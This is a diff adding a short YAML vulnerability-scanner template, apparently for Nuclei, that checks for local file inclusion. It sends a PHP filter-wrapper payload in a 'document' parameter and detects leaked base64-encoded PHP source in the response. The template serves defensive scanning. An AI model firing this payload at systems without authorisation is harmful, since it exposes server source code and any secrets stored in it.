@@ -1,0 +1,20 @@
+id: lfi6-0571
+name: 'Traversal in document'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via document'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      document:
+        - 'php://filter/convert.base64-encode/resource=index'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
